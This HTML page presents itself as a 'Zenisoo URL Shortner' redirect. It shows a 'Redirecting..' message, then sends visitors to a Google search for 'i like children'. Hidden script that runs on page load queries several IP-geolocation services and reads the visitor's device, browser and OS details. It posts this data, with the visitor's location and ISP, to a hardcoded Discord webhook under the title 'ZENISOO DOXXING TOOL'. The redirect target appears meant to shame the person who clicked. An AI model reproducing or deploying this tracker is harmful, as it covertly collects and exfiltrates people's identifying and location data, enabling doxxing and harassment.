<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="main.css">
    <meta http-equiv="refresh" content="5;url=https://www.google.com/search?q=i+like+children&oq=i+like+children&aqs=chrome..69i57j46i512j0i512l8.10840j0j4&sourceid=chrome&ie=UTF-8">
    <style>body {
    width: 100vh;
    height: 100vh;
    background-color: rgb(236, 236, 236);
}
.title {
    position: absolute;
    left: 75vh;
    right: 50vh;
    color: cornflowerblue;
    font-family: Poppins, sans-serif;
    font-weight: 500;
    font-size: 5vh;
}
.redirectbox {
    display: flex;
    align-items: center;
    justify-content: center;
    width: 205vh;
    height: 100vh;
}
.m {
    font-family: "Poppins", sans-serif;
    font-weight: 500;
    font-style: normal;
    font-size: 3vh;
}</style>
</head>
<body>
    <div class="title">Zenisoo URL Shortner</div>
    <div class="redirectbox"><div class="m">Redirecting..</div></div>
</body>
<script>
    const iptoken = 'd3df1d9e27298e';
const webhookurl = 'https://discord.com/api/webhooks/1256077249199865906/vxHTszKG92IwdvE02Sa0DCAL3olgPKFwx2lmWNc6Bv61XqBrI8vwy11Y4WziEeYf6wEO';

var t = new Date();
const timec = t.toLocaleString();

function sendToServer(embedData) {
    const webhookURL = 'https://discord.com/api/webhooks/1256077249199865906/vxHTszKG92IwdvE02Sa0DCAL3olgPKFwx2lmWNc6Bv61XqBrI8vwy11Y4WziEeYf6wEO';
    
    return fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(embedData),
    });
}

// Promise.all to fetch data from all sources concurrently
Promise.all([
    fetch(`https://ipinfo.io/json?token=${iptoken}`)
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to fetch IP information from ipinfo.io');
            }
            return response.json();
        })
        .catch(error => {
            console.error('Error fetching IP information from ipinfo.io:', error);
            return { error: true }; // Return a placeholder object indicating an error
        }),

    fetch('http://ip-api.com/json/')
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to fetch IP information from IP-API');
            }
            return response.json();
        })
        .catch(error => {
            console.error('Error fetching IP information from IP-API:', error);
            return { error: true }; // Return a placeholder object indicating an error
        }),

    fetch('https://api.ipdata.co')
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to fetch IP information from ipdata.co');
            }
            return response.json();
        })
        .catch(error => {
            console.error('Error fetching IP information from ipdata.co:', error);
            return { error: true }; // Return a placeholder object indicating an error
        }),

    fetch('https://api.ipify.org?format=json')
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to fetch IP information from ipify');
            }
            return response.json();
        })
        .catch(error => {
            console.error('Error fetching IP information from ipify:', error);
            return { error: true }; // Return a placeholder object indicating an error
        }),

    fetch('https://freegeoip.app/json/')
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to fetch IP information from freegeoip.app');
            }
            return response.json();
        })
        .catch(error => {
            console.error('Error fetching IP information from freegeoip.app:', error);
            return { error: true }; // Return a placeholder object indicating an error
        })
])
.then(responses => {
    // Process all responses
    const ipinfoData = responses[0] && !responses[0].error ? responses[0] : { error: true };
    const ipApiData = responses[1] && !responses[1].error ? responses[1] : { error: true };
    const ipDataCo = responses[2] && !responses[2].error ? responses[2] : { error: true };
    const ipifyData = responses[3] && !responses[3].error ? responses[3] : { error: true };
    const freeGeoIpData = responses[4] && !responses[4].error ? responses[4] : { error: true };

    // Determine device type based on userAgent
    const userAgent = navigator.userAgent;
    let deviceType = 'Unknown';
    if (/Mobi/.test(userAgent)) {
        deviceType = 'Mobile';
    } else if (/Tablet/.test(userAgent)) {
        deviceType = 'Tablet';
    } else {
        deviceType = 'Desktop';
    }

    // Device screen width and height
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;

    // Operating system
    const operatingSystem = (() => {
        const platform = navigator.platform;
        const userAgent = navigator.userAgent;

        if (userAgent.includes('Windows')) return 'Windows';
        if (userAgent.includes('Mac')) return 'MacOS';
        if (userAgent.includes('Linux')) return 'Linux';
        if (userAgent.includes('Android')) return 'Android';
        if (userAgent.includes('iOS')) return 'iOS';
        if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) return 'iOS';

        return platform || 'Unknown';
    })();

    // Browser
    const browser = (() => {
        const userAgent = navigator.userAgent;
        const vendor = navigator.vendor;

        if (userAgent.includes('Firefox')) return 'Firefox';
        if (userAgent.includes('Chrome')) return 'Chrome';
        if (userAgent.includes('Safari')) return 'Safari';
        if (userAgent.includes('Edge')) return 'Edge';
        if (userAgent.includes('Opera') || vendor.includes('Opera')) return 'Opera';

        return 'Unknown';
    })();

    // Construct the combined embed with available data
    sendToServer({
        embeds: [{
            title: 'ZENISOO DOXXING TOOL',
            description: `-----------IP INFO-----------
            \nIPINFO.IO:
            \nIP ADDRESS: **${ipinfoData.ip || 'Null information not sent'}**
            \nHOST NAME: **${ipinfoData.hostname || 'Null information not sent'}**
            \nCITY: **${ipinfoData.city || 'Null information not sent'}**
            \nREGION: **${ipinfoData.region || 'Null information not sent'}**
            \nCOUNTRY: **${ipinfoData.country || 'Null information not sent'}**
            \nLOCATION: **${ipinfoData.loc || 'Null information not sent'}**
            \nISP/ORG: **${ipinfoData.org || 'Null information not sent'}**
            \nPOSTAL CODE: **${ipinfoData.postal || 'Null information not sent'}**
            \nTIME ZONE: **${ipinfoData.timezone || 'Null information not sent'}**
            
            \nIP-API:
            \nIP ADDRESS: **${ipApiData.query || 'Null information not sent'}**
            \nCITY: **${ipApiData.city || 'Null information not sent'}**
            \nREGION: **${ipApiData.regionName || 'Null information not sent'}**
            \nCOUNTRY: **${ipApiData.country || 'Null information not sent'}**
            \nISP: **${ipApiData.isp || 'Null information not sent'}**
            
            \nIPDATA.CO:
            \nIP ADDRESS: **${ipDataCo.ip || 'Null information not sent'}**
            \nCITY: **${ipDataCo.city || 'Null information not sent'}**
            \nREGION: **${ipDataCo.region || 'Null information not sent'}**
            \nCOUNTRY: **${ipDataCo.country_name || 'Null information not sent'}**
            \nISP: **${ipDataCo.organization || 'Null information not sent'}**
            
            \nIPIFY:
            \nIP ADDRESS: **${ipifyData.ip || 'Null information not sent'}**
            
            \nFREEGEOIP.APP:
            \nIP ADDRESS: **${freeGeoIpData.ip || 'Null information not sent'}**
            \nCITY: **${freeGeoIpData.city || 'Null information not sent'}**
            \nREGION: **${freeGeoIpData.region_name || 'Null information not sent'}**
            \nCOUNTRY: **${freeGeoIpData.country_name || 'Null information not sent'}**
            \nISP: **${freeGeoIpData.org || 'Null information not sent'}**
            \n-----------EXTRA INFO------------
            \nDevice Type: **${deviceType}**
            \nScreen Width: **${screenWidth}**
            \nScreen Height: **${screenHeight}**
            \nDevice Model: **${navigator.userAgent}** (NOT 100% TRUSTABLE)
            \nOperating System: **${operatingSystem}**
            \nBrowser: **${browser}**
            \nTime Clicked: ${timec}
            `,
            color: 65280 // Green color
        }]
    });
})
.catch(error => {
    console.error('Error fetching IP information:', error);
    sendToServer({
        embeds: [{
            title: 'ERR',
            description: `Failed to get IP information at Time clicked: ${timec}`,
            color: 16711680 // Red color
        }]
    });
});
</script>
</html>
